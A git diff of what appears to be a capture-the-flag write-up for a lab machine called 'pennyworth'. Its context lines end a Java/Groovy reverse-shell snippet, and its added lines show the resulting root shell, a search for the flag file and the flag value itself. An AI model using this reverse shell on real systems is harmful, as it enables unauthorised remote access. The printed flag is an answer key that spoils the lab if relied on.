@@ -149,3 +149,20 @@ OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())
 while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try
 {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
+
+And that's it. I'm in. 
+
+```
+/bin/bash -i
+root@pennyworth:/#
+
+root@pennyworth:/# find / -name "flag.*" 2>/dev/null
+find / -name "flag.*" 2>/dev/null
+/root/flag.txt
+
+root@pennyworth:/# cat /root/flag.txt
+cat /root/flag.txt
+9cdfb439c7876e703e307864c9167a15
+```
+
+![image](https://github.com/GregKedrovsky/Hacking/assets/26492233/c26f2bc2-fb84-4f06-be09-44c8cbcc8fd3)
